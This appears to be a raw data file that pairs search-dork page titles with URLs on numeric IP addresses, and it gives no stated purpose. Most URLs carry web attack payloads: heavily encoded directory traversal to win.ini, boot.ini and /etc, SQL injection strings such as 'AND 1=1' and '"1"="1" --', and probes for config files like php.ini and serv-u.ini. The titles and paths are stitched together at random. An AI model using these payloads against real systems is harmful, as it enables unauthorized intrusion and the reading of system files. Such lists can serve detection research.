ListMail Login - PHP,http://103.53.79.70/cgi-dos/preferences.ini
warning - ASP Stats Generator *.*,http://61.64.230.174/login/log/include/php.ini
admin.php,http://203.105.227.164/login/enc/m2f/preferences.ini
"\""web - inc.",http://210.242.147.134/login/control/ovcgi/php.ini
Virtual - Login Form,http://210.203.16.160/loginok/%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fetc//..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fwindows/win.ini
Server Administration,http://210.242.148.156/loginadmin/..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cboot.ini
AppServ - eMule,http://103.225.3.128/login%2BAND%2B1%3D1/preferences.ini
"Execution of this s?ri?t not permitted - \""index.of.personal\""",http://210.202.233.159/login-redirect/vsadmin/..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cwindows/win.ini
welcome to netware * - Execution of this s?ri?t not permitted,http://210.242.149.162/comments/default.asp/control/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
microsoft certificate services,http://210.200.17.188/login1/inc/perl/).ini
MailMan - Blog Comments,http://210.200.17.191/loginok/phf/flashFXP.ini
"\""Big",http://103.225.3.163/login%2522%2BAND%2B%25221%2522%3D%25221%2522%2B--%2B/php.ini
"\""Multimon",http://210.242.145.130/login/sQuery/printer/netscape.ini
ADSL,http://210.242.148.172/login/lib/install/administrator/components/com_remository/2082/serv-u.ini
Athens Authentication Point - Uploader,http://210.242.148.187/login/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cboot.ini
Tomcat Server Administration - Login Form,http://210.202.233.164/login1/item_id%3D%2Bstart.php%2Bwp-json%2Bwp%2Bv2%2Bposts%2Bor%2B1%3D1%2B/**/..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fboot.ini
